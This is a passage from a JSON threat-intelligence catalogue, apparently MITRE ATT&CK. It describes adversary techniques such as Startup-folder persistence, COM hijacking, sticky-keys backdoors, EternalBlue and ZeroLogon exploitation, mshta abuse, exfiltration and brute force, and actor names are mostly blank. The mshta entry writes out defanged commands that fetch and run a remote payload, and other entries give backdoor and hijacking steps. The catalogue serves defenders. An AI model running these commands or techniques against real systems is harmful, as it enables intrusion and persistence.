      "malware can create a .lnk file and add a Registry Run key to establish persistence.",
      "adds a .lnk file to the Windows startup folder.",
      "attempts to add a shortcut file in the Startup folder to achieve persistence.",
      "establishes persistence by creating a shortcut in the Windows startup folder to run a script each time the user logs in.",
      "has used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor.",
      "A  malware sample adds persistence on the system by creating a shortcut in the user’s Startup folder.",
      "creates a shortcut file and saves it in a Startup folder to establish persistence.",
      "establishes persistence by creating a shortcut.",
      "can establish persistence by creating a .lnk file in the Start menu or by modifying existing .lnk files to execute the malware through cmd.exe.",
      "To establish persistence,  identifies the Start Menu Startup directory and drops a link to its own executable disguised as an “Office Start,” “Yahoo Talk,” “MSN Gaming Z0ne,” or “MSN Talk” shortcut.",
      "may create the file %HOMEPATH%\\Start Menu\\Programs\\Startup\\Realtek {Unique Identifier}.lnk, which points to the malicious msdtc.exe file already created in the %CommonFiles% directory.",
      "achieves persistence by creating a shortcut in the Startup folder.",
      "is capable of persisting via a .lnk file stored in the Startup directory.",
      "can create a shortcut in the Windows startup folder for persistence.",
      "achieves persistence by creating a shortcut to itself in the CSIDL_STARTUP directory.",
      "The  3 variant drops its main DLL component and then creates a .lnk shortcut to that file in the startup folder.",
      "achieves persistence by creating a shortcut in the current user's Startup folder."
    ],
    "id": "T1023",
    "name": "Shortcut Modification",
    "similar_words": [
      "Shortcut Modification"
    ]
  },
  "attack-pattern--99709758-2b96-48f2-a68a-ad7fbd828091": {
    "description": "Some adversaries may split communications between different protocols. There could be one protocol for inbound command and control and another for outbound data, allowing it to bypass certain firewall restrictions. The split could also be random to simply avoid data threshold alerts on any one communication.",
    "example_uses": [
      "\"beacon\" payload can receive C2 from one protocol and respond on another. This is typically a mixture of HTTP, HTTPS, and DNS traffic.",
      "can be configured to use multiple network protocols to avoid network-based detection.",
      "Some  malware uses multiple channels for C2, such as RomeoWhiskey-Two, which consists of a RAT channel that parses data in datagram form and a Proxy channel that forms virtual point-to-point sessions."
    ],
    "id": "T1026",
    "name": "Multiband Communication",
    "similar_words": [
      "Multiband Communication"
    ]
  },
  "attack-pattern--9b52fca7-1a36-4da0-b62d-da5bd83b4d69": {
    "description": "The  (Citation: Microsoft Component Object Model) (COM) is a system within Windows to enable interaction between software components through the operating system. (Citation: Microsoft Component Object Model) Adversaries can use this system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Windows Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead. (Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.",
    "example_uses": [
      "uses COM hijacking as a method of persistence.",
      "has been seen persisting via COM hijacking through replacement of the COM object for MruPidlList {42aedc87-2188-41fd-b9a3-0c966feabec1} or Microsoft WBEM New Event Subsystem {F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1} depending on the system's CPU architecture.",
      "samples have been seen which hijack COM objects for persistence by replacing the path to shell32.dll in registry location HKCU\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\InprocServer32.",
      "Some variants of  achieve persistence by registering the payload as a Shell Icon Overlay handler COM object.",
      "has used COM hijacking to establish persistence by hijacking a class named MMDeviceEnumerator and also by registering the payload as a Shell Icon Overlay handler COM object ({3543619C-D563-43f7-95EA-4DA7E1CC396A}).",
      "has used COM hijacking for persistence by replacing the legitimate MMDeviceEnumerator object with a payload."
    ],
    "id": "T1122",
    "name": "Component Object Model Hijacking",
    "similar_words": [
      "Component Object Model Hijacking"
    ]
  },
  "attack-pattern--9b99b83a-1aac-4e29-b975-b374950551a3": {
    "description": "Windows contains accessibility features that may be launched with a key combination before a user has logged in (for example, when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.\n\nTwo common accessibility programs are C:\\Windows\\System32\\sethc.exe, launched when the shift key is pressed five times and C:\\Windows\\System32\\utilman.exe, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)\n\nDepending on the version of Windows, an adversary may take advantage of these features in different ways because of code integrity enhancements. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in %systemdir%\\, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced. Examples for both methods:\n\nFor simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., C:\\Windows\\System32\\utilman.exe) may be replaced with \"cmd.exe\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)\n\nFor the debugger method on Windows Vista and later as well as Windows Server 2008 and later, for example, a Registry key may be modified that configures \"cmd.exe,\" or another program that provides backdoor access, as a \"debugger\" for the accessibility program (e.g., \"utilman.exe\"). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with RDP will cause the \"debugger\" program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)\n\nOther accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)\n\n* On-Screen Keyboard: C:\\Windows\\System32\\osk.exe\n* Magnifier: C:\\Windows\\System32\\Magnify.exe\n* Narrator: C:\\Windows\\System32\\Narrator.exe\n* Display Switcher: C:\\Windows\\System32\\DisplaySwitch.exe\n* App Switcher: C:\\Windows\\System32\\AtBroker.exe",
    "example_uses": [
      "replaces the Sticky Keys binary C:\\Windows\\System32\\sethc.exe for persistence.",
      "used sticky-keys to obtain unauthenticated, privileged console access.",
      "has used the sticky-keys technique to bypass the RDP login screen on remote systems during intrusions.",
      "actors have been known to use the Sticky Keys replacement within RDP sessions to obtain persistence."
    ],
    "id": "T1015",
    "name": "Accessibility Features",
    "similar_words": [
      "Accessibility Features"
    ]
  },
  "attack-pattern--9c306d8d-cde7-4b4c-b6e8-d0bb16caca36": {
    "description": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.Credentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.(Citation: Bugcrowd Replay Attack)(Citation: Comparitech Replay Attack)(Citation: Microsoft Midnight Blizzard Replay Attack)Such exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.(Citation: Storm-0558 techniques for unauthorized email access)Exploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",
    "example_uses": [
      "exploited vulnerable network appliances during  leading to the collection and exfiltration of valid credentials."
    ],
    "id": "T1212",
    "name": "Exploitation for Credential Access",
    "similar_words": [
      "Exploitation for Credential Access"
    ]
  },
  "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82": {
    "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.An adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.There are several well-known vulnerabilities that exist in common services such as SMB(Citation: CIS Multiple SMB Vulnerabilities) and RDP(Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL(Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)(Citation: Ars Technica VMWare Code Execution Vulnerability 2021) Additionally, there have been a number of vulnerabilities in VMware vCenter installations, which may enable threat actors to move laterally from the compromised vCenter server to virtual machines or even to ESXi hypervisors.(Citation: Broadcom VMSA-2024-0019)Depending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
    "example_uses": [
      "exploited a Windows SMB Remote Code Execution Vulnerability to conduct lateral movement.",
      "can use MS10-061 to exploit a print spooler vulnerability in a remote system with a shared printer in order to move laterally.",
      "uses an exploit in SMBv1 to spread itself to other remote systems on a network.",
      "has exploited or attempted to exploit Zerologon (CVE-2020-1472) and EternalBlue (MS17-010) vulnerabilities.",
      "has exploited known vulnerabilities in remote services including RDP.",
      "has used  to exploit a domain controller via the ZeroLogon exploit (CVE-2020-1472).",
      "propagates using the MS10-061 Print Spooler and MS08-067 Windows Server Service vulnerabilities.",
      "can move laterally using worm-like functionality through exploitation of SMB.",
      "has been seen exploiting SMB via a vulnerability exploit like EternalBlue (MS17-010) to achieve lateral movement and propagation.",
      "has a limited number of built-in modules for exploiting remote SMB JBoss and Jenkins servers.",
      "used the EternalRomance SMB exploit to spread through victim networks.",
      "can use two exploits in SMBv1 EternalBlue and EternalRomance to spread itself to other remote systems on the network.",
      "can spread within a network via the BlueKeep (CVE-2019-0708) and EternalBlue (CVE-2017-0144) vulnerabilities in RDP and SMB respectively.",
      "exploited the MS08-067 Windows vulnerability for remote code execution through a crafted RPC request.",
      "contains a module for exploiting SMB via EternalBlue.",
      "can exploit multiple vulnerabilities including EternalBlue (CVE-2017-0144) and EternalRomance (CVE-2017-0144).",
      "has used EternalBlue exploits for lateral movement.",
      "has used tools to exploit the ZeroLogon vulnerability (CVE-2020-1472).",
      "utilizes EternalBlue and EternalRomance exploits for lateral movement in the modules wormwinDll wormDll mwormDll nwormDll tabDll.",
      "has exploited a Windows Netlogon vulnerability (CVE-2020-1472) to obtain access to Windows Active Directory servers.",
      "has exploited the Microsoft Netlogon vulnerability (CVE-2020-1472).",
      "has exploited MS17-010 to move laterally to other systems on the network.",
      "has exploited ZeroLogon (CVE-2020-1472) against vulnerable domain controllers.",
      "has used exploits for vulnerabilities such as MS17-010 also known as `Eternal Blue` during operations."
    ],
    "id": "T1210",
    "name": "Exploitation of Remote Services",
    "similar_words": [
      "Exploitation of Remote Services"
    ]
  },
  "attack-pattern--9e09ddb2-1746-4448-9cad-7f8b41777d6d": {
    "description": "Keychains are the built-in way for macOS to keep track of users' passwords and credentials for many services and features such as WiFi passwords, websites, secure notes, certificates, and Kerberos. Keychain files are located in ~/Library/Keychains/,/Library/Keychains/, and /Network/Library/Keychains/. (Citation: Wikipedia keychain) The security command-line utility, which is built into macOS by default, provides a useful way to manage these credentials.\n\nTo manage their credentials, users have to use additional credentials to access their keychain. If an adversary knows the credentials for the login keychain, then they can get access to all the other credentials stored in this vault. (Citation: External to DA, the OS X Way) By default, the passphrase for the keychain is the user’s logon credentials.",
    "example_uses": [
      "collects Keychain storage data and copies those passwords/tokens to a file.",
      "collects the keychains on the system."
    ],
    "id": "T1142",
    "name": "Keychain",
    "similar_words": [
      "Keychain"
    ]
  },
  "attack-pattern--9e80ddfb-ce32-4961-a778-ca6a10cfae72": {
    "description": "The sudoers file, /etc/sudoers, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the idea of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like user1 ALL=(ALL) NOPASSWD: ALL (Citation: OSX.Dok Malware). \n\nAdversaries can take advantage of these configurations to execute commands as other users or spawn processes with higher privileges. You must have elevated privileges to edit this file though.",
    "example_uses": [],
    "id": "T1169",
    "name": "Sudo",
    "similar_words": [
      "Sudo"
    ]
  },
  "attack-pattern--9fa07bef-9c81-421e-a8e5-ad4366c5a925": {
    "description": "Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.Organizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for access to internal network systems may be compromised and used.(Citation: CISA IT Service Providers)In Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.(Citation: Office 365 Delegated Administration)",
    "example_uses": [
      "Once  gained access to the DCCC network, the group then proceeded to use that access to compromise the DNC network.",
      "has used legitimate access granted to Managed Service Providers in order to access victims of interest.",
      "has breached Managed Service Providers (MSP's) to deliver malware to MSP customers.",
      "Once  gained access to the DCCC network the group then proceeded to use that access to compromise the DNC network.",
      "has compromised third party service providers to gain access to victim's environments.",
      "has used dedicated network connections from one victim organization to gain unauthorized access to a separate organization.",
      "During the   gained access through compromised accounts at cloud solution partners and used compromised certificates issued by Mimecast to authenticate to Mimecast customer systems.",
      "has compromised IT cloud services and managed services providers to gain broad access to multiple customers for subsequent operations.",
      "has used compromised credentials from an IT company to target downstream customers including a law firm and aviation company.",
      "has accessed internet-facing identity providers such as Azure Active Directory and Okta to target specific organizations.",
      "has used dedicated network connections from one victim organization to gain unauthorized access to a separate organization. Additionally  has accessed Internet service providers and telecommunication entities that provide mobile connectivity.",
      "has gained access to a contractor to pivot to the victims infrastructure.",
      "has used stolen API keys and credentials associatd with privilege access management (PAM) cloud app providers and cloud data management companies to access downstream customer environments.",
      "targeted third-party entities in trusted relationships with primary targets to ultimately achieve access at primary targets. Entities targeted included DNS registrars telecommunication companies and internet service providers."
    ],
    "id": "T1199",
    "name": "Trusted Relationship",
    "similar_words": [
      "Trusted Relationship"
    ]
  },
  "attack-pattern--a0a189c8-d3bd-4991-bf6f-153d185ee373": {
    "description": "As of OS X 10.8, mach-O binaries introduced a new header called LC_MAIN that points to the binary’s entry point for execution. Previously, there were two headers to achieve this same effect: LC_THREAD and LC_UNIXTHREAD  (Citation: Prolific OSX Malware History). The entry point for a binary can be hijacked so that initial execution flows to a malicious addition (either another section or a code cave) and then goes back to the initial entry point so that the victim doesn’t know anything was different  (Citation: Methods of Mac Malware Persistence). By modifying a binary in this way, application whitelisting can be bypassed because the file name or application path is still the same.",
    "example_uses": [],
    "id": "T1149",
    "name": "LC_MAIN Hijacking",
    "similar_words": [
      "LC_MAIN Hijacking"
    ]
  },
  "attack-pattern--a10641f4-87b4-45a3-a906-92a149cb2c27": {
    "description": "Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation may consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups.(Citation: FireEye SMOKEDHAM June 2021) These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged [Valid Accounts](https://attack.mitre.org/techniques/T1078).",
    "example_uses": [
      "added newly created accounts to the administrators group to maintain elevated access.",
      "has been known to add created accounts to local admin groups to maintain elevated access.",
      "adds permissions and remote logins to all users.",
      "is used to patch an enterprise domain controller authentication process with a backdoor password. It allows adversaries to bypass the standard authentication system to use a defined password for all accounts authenticating to that domain controller.",
      "The  credential dumper has been extended to include Skeleton Key domain controller authentication bypass functionality. The LSADUMP::ChangeNTLM and LSADUMP::SetNTLM modules can also manipulate the password hash of an account without knowing the clear text value.",
      "malware WhiskeyDelta-Two contains a function that attempts to rename the administrator’s account.",
      "malware WhiskeyDelta-Two contains a function that attempts to rename the administrators account.",
      "has added user accounts to local Admin groups.",
      "has added user accounts to the User and Admin groups.",
      "has added a user named DefaultAccount to the Administrators and Remote Desktop Users groups.",
      "has created their own accounts with Local Administrator privileges to maintain access to systems with short-cycle credential rotation.",
      "has added newly created accounts to the administrators group to maintain elevated access.",
      "has assigned newly created accounts the sysadmin role to maintain persistence.",
      "During the   used the `sp_addlinkedsrvlogin` command in MS-SQL to create a link between a created account and other servers in the network.",
      "elevates accounts created through the malware to the local administration group during execution.",
      "has granted privileges to domain accounts.",
      "has added a user named supportaccount to the Remote Desktop Users and Administrators groups.",
      "has added accounts to specific groups with net localgroup.",
      "has granted privileges to domain accounts and reset the password for default admin accounts."
    ],
    "id": "T1098",
    "name": "Account Manipulation",
    "similar_words": [
      "Account Manipulation"
    ]
  },
  "attack-pattern--a127c32c-cbb0-4f9d-be07-881a792408ec": {
    "description": "Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension .hta. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\n\nAdversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \n\nFiles may be executed by mshta.exe through an inline script: mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))\n\nThey may also be executed directly from URLs: mshta http[:]//webserver/payload[.]hta\n\nMshta.exe can be used to bypass application whitelisting solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: GitHub SubTee The List)",
    "example_uses": [
      "can use MSHTA to serve additional payloads.",
      "uses mshta.exe to load its program and files.",
      "can use Mshta.exe to execute additional payloads on compromised hosts.",
      "has used Mshta.exe to execute its  payload.",
      "has used mshta.exe to execute VBScript to execute malicious code on victim systems."
    ],
    "id": "T1170",
    "name": "Mshta",
    "similar_words": [
      "Mshta"
    ]
  },
  "attack-pattern--a19e86f8-1c0a-4fea-8407-23b73d615776": {
    "description": "Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048) can be done using various common operating system utilities such as [Net](https://attack.mitre.org/software/S0039)/SMB or FTP.(Citation: Palo Alto OilRig Oct 2016) On macOS and Linux curl may be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system.(Citation: 20 macOS Common Tools and Techniques)Many IaaS and SaaS platforms (such as Microsoft Exchange, Microsoft SharePoint, GitHub, and AWS S3) support the direct download of files, emails, source code, and other sensitive information via the web console or [Cloud API](https://attack.mitre.org/techniques/T1059/009).",
    "example_uses": [
      "has used WinSCP to exfiltrate data from a targeted organization over FTP.",
      "has used FTP to exfiltrate collected data.",
      "connects to a predefined domain on port 443 to exfil gathered information.",
      "can be used to create  to upload files from a compromised host.",
      "has exfiltrated data over FTP separately from its primary C2 channel over DNS.",
      "exfiltrates collected files over FTP or WebDAV. Exfiltration servers can be separately configured from C2 servers.",
      "exfiltrates data by uploading it to accounts created by the actors on Web cloud storage providers for the adversaries to retrieve later.",
      "exfiltrates files over FTP.",
      "can exfiltrate data via a DNS tunnel or email, separately from its C2 channel.",
      "may be used to exfiltrate data separate from the main command and control protocol.",
      "malware SierraBravo-Two generates an email message via SMTP containing information about newly infected victims.",
      "uses the curl -s -L -o command to exfiltrate archived data to a URL.",
      "has used a .NET tool named dog.exe to exiltrate information over an e-mail account.",
      "has sent locally staged files with collected credentials to C2 servers using cURL.",
      "has exfiltrated its collected data from the infected machine to the C2 sometimes using the MIME protocol.",
      "can use DNS tunneling for exfiltration of credit card data.",
      "can exfiltrate credentials over the network via UDP.",
      "can directly download cloud user data such as OneDrive files.",
      "has used WinSCP to exfiltrate data to actor-controlled accounts."
    ],
    "id": "T1048",
    "name": "Exfiltration Over Alternative Protocol",
    "similar_words": [
      "Exfiltration Over Alternative Protocol"
    ]
  },
  "attack-pattern--a257ed11-ff3b-4216-8c9d-3938ef57064c": {
    "description": "Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.\n\nIn this technique, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078) are captured by [Credential Dumping](https://attack.mitre.org/techniques/T1003). A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access. (Citation: ADSecurity AD Kerberos Attacks) (Citation: GentilKiwi Pass the Ticket)\n\nSilver Tickets can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint). (Citation: ADSecurity AD Kerberos Attacks)\n\nGolden Tickets can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory. (Citation: Campbell 2014)",
    "example_uses": [
      "has used  to generate Kerberos golden tickets.",
      "has created forged Kerberos Ticket Granting Ticket (TGT) and Ticket Granting Service (TGS) tickets to maintain administrative access.",
      "’s LSADUMP::DCSync, KERBEROS::Golden, and KERBEROS::PTT modules implement the three steps required to extract the krbtgt account hash and create/use Kerberos tickets.",
      "Some  samples have a module to use pass the ticket with Kerberos for authentication."
    ],
    "id": "T1097",
    "name": "Pass the Ticket",
    "similar_words": [
      "Pass the Ticket"
    ]
  },
  "attack-pattern--a6525aec-acc4-47fe-92f9-b9b4de4b9228": {
    "description": "The Graphical User Interfaces (GUI) is a common way to interact with an operating system. Adversaries may use a system's GUI during an operation, commonly through a remote interactive session such as [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076), instead of through a [Command-Line Interface](https://attack.mitre.org/techniques/T1059), to search for information and execute files via mouse double-click events, the Windows Run command (Citation: Wikipedia Run Command), or other potentially difficult to monitor interactions.",
    "example_uses": [
      "has interacted with compromised systems to browse and copy files through its graphical user interface in  sessions."
    ],
    "id": "T1061",
    "name": "Graphical User Interface",
    "similar_words": [
      "Graphical User Interface"
    ]
  },
  "attack-pattern--a93494bb-4b80-4ea1-8695-3236a49916fd": {
    "description": "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained.(Citation: TrendMicro Pawn Storm Dec 2020) Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism.(Citation: Dragos Crashoverride 2018) Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.Brute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), [Account Discovery](https://attack.mitre.org/techniques/T1087), or [Password Policy Discovery](https://attack.mitre.org/techniques/T1201). Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services](https://attack.mitre.org/techniques/T1133) as part of Initial Access.",
    "example_uses": [
      "used a tool called BruteForcer to perform a brute force attack.",
      "dropped and executed tools used for password cracking, including Hydra.",
      "has used brute force techniques to obtain credentials.",
      "conducts brute force attacks against SSH services to gain initial access.",
      "has been known to brute force password hashes to be able to leverage plain text credentials.",
      "uses a list of known credentials gathered through credential dumping to guess passwords to accounts as it spreads throughout a network.",
      "malware attempts to connect to Windows shares for lateral movement by using a generated list of usernames, which center around permutations of the username Administrator, and weak passwords.",
      "may attempt to connect to systems within a victim's network using net use commands and a predefined list or collection of passwords.",
      "has brute forced RDP credentials.",
      "has used brute force attacks to compromise valid credentials.",
      "has a module to perform brute force attacks on a system.",
      "used brute-force attack to obtain login data.",
      "During   performed brute force attacks against administrator accounts.",
      "has has used the tool GET2 Penetrator to look for remote login and hard-coded credentials.",
      "has attempted to brute force hosts over SSH.",
      "has used brute force techniques to attempt account access when passwords are unknown or when password hashes are unavailable.",
      "has modules for brute forcing local administrator and AD user accounts.",
      "can conduct brute force attacks to capture credentials.",
      "has used Ncrack to reveal credentials.",
      "During the   used a script to attempt RPC authentication against a number of hosts.",
      "has attempted to brute force credentials to gain access.",
      "has used brute force attempts against a central management console as well as some Active Directory accounts.",
      "can brute force supplied user credentials across a network range.",
      "can perform brute force attacks to obtain credentials.",
      "used the `su-bruteforce` tool to brute force specific users using the `su` command.",
      "performed password brute-force attacks on the local admin account.",
      "engaged in various brute forcing activities via SMB in victim environments."
    ],
    "id": "T1110",
    "name": "Brute Force",
    "similar_words": [
      "Brute Force"
    ]
  },
  "attack-pattern--aa8bfbc9-78dc-41a4-a03b-7453e0fdccda": {
    "description": "macOS and OS X use a common method to look for required dynamic libraries (dylib) to load into a program based on search paths. Adversaries can take advantage of ambiguous paths to plant dylibs to gain privilege escalation or persistence.\n\nA common method is to see what dylibs an application uses, then plant a malicious version with the same name higher up in the search path. This typically results in the dylib being in the same folder as the application itself. (Citation: Writing Bad Malware for OSX) (Citation: Malware Persistence on OS X)\n\nIf the program is configured to run at a higher privilege level than the current user, then when the dylib is loaded into the application, the dylib will also run at that elevated level. This can be used by adversaries as a privilege escalation technique.",
    "example_uses": [],
    "id": "T1157",
    "name": "Dylib Hijacking",
    "similar_words": [
      "Dylib Hijacking"
    ]
  },
  "attack-pattern--ad255bfe-a9e6-4b52-a258-8d3462abe842": {
    "description": "Adversaries may obfuscate command and control traffic to make it more difficult to detect.(Citation: Bitdefender FunnyDream Campaign November 2020) Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols. ",
    "example_uses": [
      "generates a false TLS handshake using a public certificate to disguise C2 network communications.",
      "encodes C2 communications with base64.",
      "base64 encodes strings that are sent to the C2 over its DNS tunnel.",
      "has retrieved stage 2 payloads as Bitmap images that use Least Significant Bit (LSB) steganography.",
      "can use steganography to hide malicious code downloaded to the victim.",
      "Some  samples use standard Base64 + bzip2, and some use standard Base64 + reverse XOR + RSA-2048 to decrypt data received from C2 servers.",
      "is controlled via commands that are appended to image files.",
      "inserts pseudo-random characters between each original character during encoding of C2 network requests, making it difficult to write signatures on them.",
      "C2 traffic attempts to evade detection by resembling data generated by legitimate messenger applications, such as MSN and Yahoo! messengers.",
      "Newer variants of  will encode C2 communications with a custom system.",
      "After encrypting C2 data,  converts it into a hexadecimal representation and then encodes it into base64.",
      "When the  command and control is operating over HTTP or HTTPS, Duqu uploads data to its controller by appending it to a blank JPG file.",
      "The  malware uses custom Base64 encoding schemes to obfuscate data command and control traffic in the message body of HTTP requests.",
      "obfuscates C2 traffic with an altered version of base64.",
      "added junk data to outgoing UDP packets to peer implants.",
      "added \"junk data\" to each encoded string, preventing trivial decoding without knowledge of the junk removal algorithm. Each implant was given a \"junk length\" value when created, tracked by the controller software to allow seamless communication but prevent analysis of the command protocol on the wire.",
      "The  group has used other forms of obfuscation, include commingling legitimate traffic with communications traffic so that network streams appear legitimate. Some malware that has been used by  also uses steganography to hide communication in PNG image files.",
      "has hashed a string containing system information prior to exfiltration via POST requests.",
      "has the ability to modify headers and URL paths to hide malicious traffic in HTTP requests.",
      "can masquerade its C2 traffic as legitimate Google Notifications HTTP requests.",
      "During  threat actors encrypted IP addresses used for Agent proxy hops with RC4.",
      "can send compressed and obfuscated packets to C2.",
      "will retrieved encrypted commands from its command and control server for follow-on actions such as cryptocurrency mining.",
      "can send and receive zlib compressed data within `POST` requests.",
      "has used encoded data within subdomains as AES ciphertext to communicate from the host to the C2.",
      "may obfuscate portions of the initial C2 handshake.",
      "can embed C2 responses in the source code of a fake Flickr webpage.",
      "has used obfuscated VBScripts with randomly generated variable names and concatenated strings.",
      "Okrum leverages the HTTP protocol for C2 communication while hiding the actual messages in the Cookie and Set-Cookie headers of the HTTP requests.",
      "encrypts the payload of HTTP POST communications using the same XOR key used for the malware's DLL payload."
    ],
    "id": "T1001",
    "name": "Data Obfuscation",
    "similar_words": [
      "Data Obfuscation"
    ]
  },
  "attack-pattern--ae676644-d2d2-41b7-af7e-9bed1b55898c": {
    "description": "Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information.",
    "example_uses": [
      "extracted Word documents from a file server on a victim network.",
      "has exfiltrated files stolen from file shares.",
      "has collected data from remote systems by mounting network shares with net use and using Robocopy to transfer data.",
      "steals user files from network shared drives with file extensions and keywords that match a predefined list.",
      "When it first starts,  crawls the victim's mapped drives and collects documents with the following extensions: .doc, .docx, .pdf, .ppt, .pptx, and .txt.",
      "has collected files from network shared drives.",
